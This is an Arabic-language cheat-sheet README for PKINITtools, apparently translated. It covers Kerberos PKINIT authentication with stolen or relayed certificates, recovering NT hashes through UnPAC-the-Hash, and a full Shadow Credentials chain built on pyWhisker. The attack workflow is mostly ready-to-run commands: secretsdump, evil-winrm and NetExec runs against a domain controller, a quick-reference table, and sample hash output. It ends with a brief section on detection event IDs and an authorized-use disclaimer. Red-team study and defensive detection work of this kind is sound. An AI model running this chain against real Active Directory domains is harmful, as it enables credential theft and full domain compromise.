<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎫 PKINITtools - ورقة الغش الكاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ██╗  ██╗██╗███╗   ██╗██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗██║ ██╔╝██║████╗  ██║██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝█████╔╝ ██║██╔██╗ ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔═══╝ ██╔═██╗ ██║██║╚██╗██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██║     ██║  ██╗██║██║ ╚████║██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
       Kerberos PKINIT Authentication, Shadow Credentials & UnPAC-the-Hash Toolkit
```
<p align="center">
  <img src="https://img.shields.io/badge/PKINITtools-Kerberos_PKINIT-blue?style=for-the-badge" alt="PKINITtools">
  <img src="https://img.shields.io/badge/Author-Dirk--jan_Mollema-orange?style=for-the-badge" alt="dirkjanm">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-MIT-red?style=for-the-badge" alt="License MIT">
</ص>

<p align="center">
  <b>🌐 أدوات تشفير المفتاح العام لـ Kerberos للمصادقة الأولية (PKINIT)، وتحويل الشهادات إلى تذاكر TGT واستعادة تجزئات NT</b>
</ص>

---

## 📋 جدول المحتويات

- [نظرة عامة وبنية PKINIT](#-نظرة عامة--بنية-pkinit)
- [الأدوات المساعدة الرئيسية: `gettgtpkinit.py` & `getskeyhash.py`](#-key-utilities-gettgtpkinitpy--getskeyhashpy)
- [التثبيت](#-التثبيت)
- [تحويل شهادات AD CS إلى Kerberos TGT](#-converting-ad-cs-certificates-to-kerberos-tgt)
  - [استخدام ملف PFX](#using-a-pfx-file)
  - [استخدام PFX المشفر بـ Base64 (سلاسل التتابع)](#using-base64-encoded-pfx-relay-chains)
- [استعادة تجزئة NT (UnPAC-the-Hash)](#-recovering-nt-hashes-unpac-the-hash)
- [سير عمل هجوم بيانات اعتماد الظل](#-سير عمل هجوم بيانات اعتماد الظل)
- [استهلاك TGT مع Impacket وNetExec](#-ستهلك-the-tgt-with-impacket--netexec)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية والكشف](#-الاعتبارات الدفاعية--الكشف)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)

---

## 🎯 نظرة عامة وهندسة PKINIT

**PKINIT** (تشفير المفتاح العام للمصادقة الأولية في Kerberos، المحدد في **RFC 4556**) هو امتداد لبروتوكول Kerberos. بدلاً من طلب تجزئة كلمة المرور السرية للمستخدم (NTLM أو AES) لطلب تذكرة منح تذكرة Kerberos (TGT)، تسمح PKINIT للعميل بإثبات الهوية باستخدام **شهادات X.509 الرقمية وأزواج المفاتيح الخاصة/العامة**.

تم إنشاء **PKINITtools** بواسطة باحث Active Directory الشهير **Dirk-jan Mollema (@_dirkjan)**، وهو يوفر أساسيات Python الأساسية من أجل:
1. قم بالمصادقة على وحدات تحكم مجال Active Directory عبر PKINIT باستخدام الشهادات الرقمية المستخرجة أو المنقولة.
2. احصل على ملف Kerberos TGT القياسي (`.ccache`).
3. قم باسترداد النص الواضح **NTLM Hash** للحساب عبر آلية **UnPAC-the-Hash**.

---

## 🧰 الأدوات المساعدة الرئيسية: `gettgtpkinit.py` و`getskeyhash.py`

- **`gettgtpkinit.py`**: يتصل بـ KDC (مركز توزيع مفاتيح Kerberos) عبر المنفذ 88، ويقدم الشهادة، ويطلب TGT مصفحًا، ويحفظه كملف Kirbi أو ccache.
- **`getskeyhash.py`**: يستجوب Kerberos PAC (شهادة سمة الامتياز) التي تم إرجاعها في تذكرة PKINIT لحساب وكشف تجزئة NT الثابتة للحساب.

---

## 📥 التثبيت
```bash
# Clone GitHub repository
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools

# Install dependencies (requires impacket, cryptography, minikerberos)
pip3 install -r requirements.txt
pip3 install .
```
---

## 🎫 تحويل شهادات AD CS إلى Kerberos TGT

عندما تحصل على شهادة Active Directory عبر Certipy أو Coercer أو NTLM Relay:

### استخدام ملف PFX
```bash
# Request TGT using a client certificate file (.pfx)
gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'CertPass123' corp.local/administrator admin.ccache
```
### استخدام PFX بتشفير Base64 (سلاسل التتابع)

في كثير من الأحيان، يقوم `ntlmrelayx` بطباعة الشهادات كسلسلة أساسية أساسية 64 أثناء هجمات AD CS ESC8:
```bash
# Convert base64 certificate directly into a Kerberos TGT for Domain Controller (DC01$)
gettgtpkinit.py -pfx-base64 "MIIKggIBAzCCCXwGCSqGSIb3DQEHA..." corp.local/DC01\$ dc01.ccache
```
---

## 🔑 استرداد تجزئة NT (UnPAC-the-Hash)

عندما تتم مصادقة الحساب باستخدام PKINIT، تقوم وحدة تحكم المجال بتوقيع PAC باستخدام بنية PAC_CREDENTIAL_INFO التي تحتوي على **تجزئة NTLM** الثابتة للحساب (المشفرة بمفتاح AS-REP مؤقت). يقوم `getskeyhash.py` بفك تشفير هذه البنية:
```bash
# Extract the NTLM hash directly from the ticket and KDC
getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache

# Output format:
# [*] Found PAC DATA
# [*] Decrypted PAC_CREDENTIAL_INFO
# [!] Recovered NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```
مع وجود تجزئة NT في متناول اليد، يمكنك تنفيذ **Pass-the-Hash** أو الاختراق دون الاتصال بالإنترنت على الفور!

---

## 👥 سير عمل هجوم بيانات اعتماد الظل

عندما يكون لديك حق الوصول للكتابة عبر كائن Active Directory (`GenericAll`، `GenericWrite`، `WriteProperty` عبر `msDS-KeyCredentialLink`):
```bash
# 1. Use pyWhisker to inject a newly generated key credential into the victim object
pywhisker.py -d "corp.local" -u "lowuser" -p "Password123" --target "TargetUser" --action "add" --export "targetuser.pfx"

# 2. Use PKINITtools to authenticate with the forged certificate
gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass "pywhisker" corp.local/TargetUser target.ccache

# 3. Extract TargetUser's NT Hash
getskeyhash.py corp.local/TargetUser target.ccache
```
---

## 🚀 استهلاك TGT مع Impacket وNetExec

بمجرد قيام `gettgtpkinit.py` بإخراج تذكرة `.ccache`، قم بتصديرها إلى البيئة:
```bash
# Set Kerberos credential cache environment variable
export KRB5CCNAME=/path/to/admin.ccache

# Dump domain secrets via Impacket without passwords!
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local

# Connect via Evil-WinRM using Kerberos ticket
evil-winrm -i dc01.corp.local -r corp.local

# Execute commands using NetExec with Kerberos auth
nxc smb dc01.corp.local -k --no-pass -x "whoami /priv"
```
---

## ⚡ جدول مرجعي سريع

| الهدف | الأمر |
|-----------|--------|
| ** TGT عبر ملف PFX ** | `gettgtpkinit.py -cert-pfx <FILE.pfx> <DOMAIN>/<USER> <OUT.ccache>` |
| ** TGT عبر Base64 Cert ** | `gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <OUT.ccache>` |
| **حدد وحدة تحكم المجال**| `gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <CERT> <DOMAIN>/<USER> <TGT>` |
| ** UnPAC-the-Hash (احصل على NTLM)**| `getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>` |
| ** تمرير TGT إلى Impacket ** | `export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>` |
| ** تمرير TGT إلى NetExec ** | `export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass` |

---

## 🛡️ الاعتبارات الدفاعية والكشوفات

1. **معرف الحدث 4768 (طلب TGT):** يقوم Active Directory بتسجيل طلبات Kerberos TGT. عند استخدام PKINIT، يعرض الحقل **نوع المصادقة المسبقة** `16` (PKINIT)، بدلاً من `2` (PA-ENC-TIMESTAMP).
2. ** تدقيق تعديلات `msDS-KeyCredentialLink`: ** يسجل معرف الحدث 5136 تعديلات كائن الدليل. التنبيه عند إلحاق بيانات الاعتماد الرئيسية بالحسابات المُدارة غير التابعة لـ Azure/Intune.

---

## ⚠️إخلاء المسؤولية القانونية

> [!تنبيه]
> تم تصميم PKINITtools للتدقيق الأمني المعتمد لـ Active Directory وعمليات الفريق الأحمر والأبحاث التعليمية فقط. يعد التعامل مع تذاكر Kerberos الخاصة بالشركة دون الحصول على إذن صريح أمرًا غير قانوني.